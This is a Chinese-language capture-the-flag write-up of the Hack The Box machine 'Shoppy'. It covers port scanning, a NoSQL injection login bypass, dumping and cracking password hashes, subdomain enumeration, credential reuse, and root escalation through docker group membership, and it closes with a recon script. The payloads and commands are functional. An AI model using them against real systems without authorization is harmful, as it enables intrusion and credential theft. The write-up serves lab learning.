---
tags:
  - HTB/Linux
  - HTB/Easy
---

## 扫描

### 端口

```bash
nmap -v -n -Pn -sCV -oN Shoppy.nmap 10.10.11.180
```
只扫出22和80端口。


## 漏洞分析

### 80端口

将靶机域名加入hosts后访问。  
虽然感觉HTB的靶机域名应该都挺固定的，姑且写了个命令行，收集域名后加入hosts文件，看看以后能否通用：  
```bash
HTB_IP='10.10.11.180'; cat -e /etc/hosts && sudo sh -c "echo \"${HTB_IP}    $(curl -I ${HTB_IP} | grep -oP '(?<=Location: http://).*' | sed 's/\r//g')\"  >> /etc/hosts"; cat -e /etc/hosts
``` 

- 无robots  
- 网页源码无发现  
- 网站无特别功能

本来打算枚举一下目录，不过惯例试了一下 `/login` 可以。  
在登陆界面尝试了几个SQLi绕过未果。SQLi只会一点基础的……卡住  

*搜了一波WP原来这里是 [NoSQL](https://book.hacktricks.xyz/pentesting-web/nosql-injection#sql-mongo) ……*

`admin'||'1==1` 成功登入。

admin界面有搜索框，输入 `admin` 搜索有回显admin的密码。看上去感觉是MD5加密。  
在搜索框输入同样的 `NoSQLi`，成功回显所有用户（admin和josh）的账号密码。

放进[MD5解码网站](../tool-links.md#_2)试试。`josh` 用户可成功解码。

但是至此似乎没什么其他攻击路径了。

#### 子域枚举

由于是靶机所以只扫虚拟主机的子域

```bash
gobuster vhost -u shoppy.htb -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -t 500 --append-domain
```

扫出一个：`Found: mattermost.shoppy.htb Status: 200 [Size: 3122]`，将其也加入hosts。  
*最开始没加 `--append-domain` 啥都没扫出来。所以最好正式开扫之前加上 `-v` 小扫一下看看，否则都不知道自己扫的是啥容易错过突破口。*

#### 从子域突破

但是访问后是空白页面，试着刷新几次发现似乎有一闪而过的登陆界面。  
开burp拦截使其停在登录界面，输入刚破解的 `josh` 的账号密码，成功登入。


## foothold

是一个聊天工具的样子。有个带锁的频道十分引人注意。看了眼内容是让我们（josh）部署一个机器。还有账号密码：  

	username: jaeger
	password: Sh0ppyBest@pp!

SSH登陆成功。


## get user flag

```bash
jaeger@shoppy:~$ cat user.txt
```


## 横向移动

首先看看 `sudo -l`：  
```bash
jaeger@shoppy:~$ id
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)


jaeger@shoppy:~$ sudo -l
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager


jaeger@shoppy:~$ ls -l /home/deploy/
total 28
-rw------- 1 deploy deploy    56 Jul 22 13:15 creds.txt
-rwxr--r-- 1 deploy deploy 18440 Jul 22 13:20 password-manager
-rw------- 1 deploy deploy   739 Feb  1  2022 password-manager.cpp
```

deploy家目录有creds.txt但是无法读取。  

看看sudo的那个命令是啥：  
`strings /home/deploy/password-manager`，注意到里面有段文字：`cat /home/deploy/creds.txt`  
似乎这个脚本可以读取creds.txt。尝试一下执行：  
```
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sh0ppyBest@pp!
Access denied! This incident will be reported !
```

但是不知道密码？？josh的那个不行，需要什么master password。迷茫……

*看了眼WP，竟然是用 `cat password-manager` 能发现有用的信息，服了。一直惯性觉得cat二进制文件没用每次都直接strings了……*

```bash
jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

SSH成功登陆 `deploy` 用户。
```bash
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```


## 提权

`deploy` 用户的这个 `998(docker)` 是什么情况，值得探究一下。  
通过[gtfobins](https://gtfobins.github.io/gtfobins/docker/)发现可以利用。运行下面命令后成功得到root shell：  
```bash
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```


## get root flag

```bash
# cd
# ls
root.txt
# cat root.txt
```


---

## 后记

原来是NoSQL...

说是多了个横向移动吧，其实和之前靶机比，从foothold开始获得的用户数量又没差。  
大概是因为这次是web打点时用了一个账户，后来用的又是两个普通用户的账户而没有应用账户吧。

以及以前一直觉得既然SSH能成功登陆，就已经知道自己登陆的是什么用户，那么 `id` 命令没啥意义。  
这次随手一打竟然能发现deploy用户属于docker组，从而发现突破口，也属实是运气了……


最后，  
联系[这个思路](../InformationGathering/summary.md#web_info_gathering)，感觉信息搜集可以弄一个简易脚本。以后试试直接用这个：

### HTB_easy_firstScaning
 
```bash
#!/usr/bin/bash
# -*- coding:utf-8 -*-

## This script is requires root privilege for running.
set -eu

HTB_IP=${1}
echo "[info] Starting scan..."

# --max-retries=0 maybe ok, but sometimes missing some ports. Default is 10.
ports=$(nmap -n -Pn -sS -p 1-10000 ${HTB_IP} --min-rate=5000 --max-retries=1 | grep ^[0-9] | cut -d / -f1 | tr '\n' ',' | sed s/,$//)
echo "[info] Opening port: ${ports}"

# Since nmap scanning is too time-consuming, let it run in background.
nohup nmap -v -n -Pn -sV -O -p ${ports} --script=vuln ${HTB_IP} > "${HTB_IP}.nmap" 2>&1 &

if [[ ${ports} =~ '80' ]];then
  HTB_DOMAIN=$(curl -I ${HTB_IP} | grep -oP '(?<=Location: http://).*' | tr -d '/\r')
  echo "[info] domain: ${HTB_DOMAIN}"

  if [[ ${HTB_DOMAIN} != '' ]];then
    # for backup
    cat -e /etc/hosts
    echo "-------- Backed up hosts --------"
    
    echo "${HTB_IP}    ${HTB_DOMAIN}" >> /etc/hosts
    
    cat -e /etc/hosts
    echo "-------- Modified hosts --------"

    echo "[info] Scanning subdomain..."
    gobuster vhost -u ${HTB_DOMAIN} -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -t 500 --append-domain -o "subdomains_${HTB_DOMAIN}.txt"
    echo "[info] End of subdomain scan..."
  fi
fi

ps -ef | grep 'nmap -v -n -Pn'
echo "[info] Please check nmap status with: ps -ef | grep 'nmap -v -n -Pn'"
```